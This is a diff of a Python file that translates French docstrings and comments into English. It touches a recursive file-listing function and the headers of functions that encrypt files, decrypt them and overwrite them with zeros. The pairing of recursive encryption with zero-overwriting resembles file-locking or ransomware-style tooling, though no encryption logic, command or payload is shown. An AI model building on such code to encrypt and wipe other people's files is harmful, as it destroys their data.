@@ -32,26 +32,27 @@ class generate_thread(threading.Thread):
 
 
 def list_files(path):
-    """ Liste les fichiers d'un dossier et de ses sous-dossiers
-    :param path -- chemin vers le dossier:
-    :return -- renvoie une liste des fichiers:
     """
-    # variables
-    # Liste contenant les noms des fichiers
+    List files in a folder and its subfolders
+    :param path -- path to the folder:
+    :return -- return a files list:
+    """
+    # List containing the files
     liste_des_fichiers = []
 
-    # Loop pour récupérer les chemins et noms des fichiers
+    # Loop to retrieve the paths and filenames
     for current_directory, sub_directories, files in os.walk(path):
         for file in files:
             full_path_filename = (os.path.join(path + os.path.relpath(current_directory, path), file))
             liste_des_fichiers.append(full_path_filename)
 
-    # On retourne la liste des fichiers
+    # Return a files list
     return liste_des_fichiers
 
 
 def encryption_function(key, non_encrypt_file):
-    """ encrypt function
+    """
+    encrypt function
     :param key -- key to encrypt:
     :param non_encrypt_file -- file to encrypt:
     """
@@ -112,7 +113,8 @@ def decryption_function(key, encrypt_file):
 
 
 def overwrite_file(filename):
-    """ Overwrite a file with zeros
+    """
+    Overwrite a file with zeros
     :param filename -- file to fill with zeros:
     """
 
